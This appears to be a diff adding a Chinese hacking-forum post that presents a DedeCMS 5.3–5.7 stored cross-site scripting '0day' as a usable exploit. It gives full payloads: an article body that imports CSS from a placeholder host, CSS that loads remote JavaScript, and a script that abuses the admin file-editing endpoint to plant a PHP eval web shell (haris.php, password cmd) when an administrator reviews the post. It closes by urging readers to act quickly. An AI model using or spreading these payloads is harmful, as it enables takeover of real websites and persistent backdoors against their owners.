@@ -1,0 +1,54 @@
+dedecms xss oday通杀所有版本 可getshell
+dedecms xss oday通杀所有版本(T00ls首发) by haris
+作者：haris
+漏洞原因：由于编辑器过滤不严，将导致恶意脚本运行。可getshell
+为什么说它是ODay呢，能getshell的都算OD把`(鸡肋发挥起来也能变凤凰)
+目前只是测试过5.3到5.7版本。其他更早的版本大家就自由发挥吧。
+下面说说利用方法。
+条件有2个：
+1.开启注册
+2.开启投稿
+注册会员----发表文章
+内容填写：
+<style>@im\port'\http://xxx.com/xss.css';</style>
+新建xss.css，内容：
+body{
+background-image:url('javascript:document.write("<script src=http://xxx.com/xss.js></script>")')
+}
+新建xss.js文件，内容：
+var request = false;
+if(window.XMLHttpRequest) {
+request = new XMLHttpRequest();
+if(request.overrideMimeType) {
+request.overrideMimeType('text/xml');
+}
+} else if(window.ActiveXObject) {
+var versions = ['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 'Microsoft.XMLHTTP', 'Msxml2.XMLHTTP.7.0','Msxml2.XMLHTTP.6.0','Msxml2.XMLHTTP.5.0', 'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP'];
+for(var i=0; i<versions.length; i++) {
+try {
+request = new ActiveXObject(versions);
+} catch(e) {}
+}
+}
+xmlhttp=request; 
+function getFolder( url ){
+    obj = url.split('/')
+    return obj[obj.length-2]
+}
+oUrl = top.location.href;
+u = getFolder(oUrl);
+add_admin(); 
+function add_admin(){
+var url= "/"+u+"/sys_sql_query.php";
+var params ="fmdo=edit&backurl=&activepath=%2Fdata&filename=haris.php&str=%3C%3Fphp+eval%28%24_POST%5Bcmd%5D%29%3F%3E&B1=++%E4%BF%9D+%E5%AD%98++";   
+xmlhttp.open("POST", url, true); 
+xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+xmlhttp.setRequestHeader("Content-length", params.length);
+xmlhttp.setRequestHeader("Connection", "Keep-Alive");
+xmlhttp.send(params);
+}
+
+当管理员审核这篇文章的时候，将自动在data目录生成一句话haris.php。密码cmd
+
+大家抓紧时间吧。。。。。。。。。。。。。。。 
+
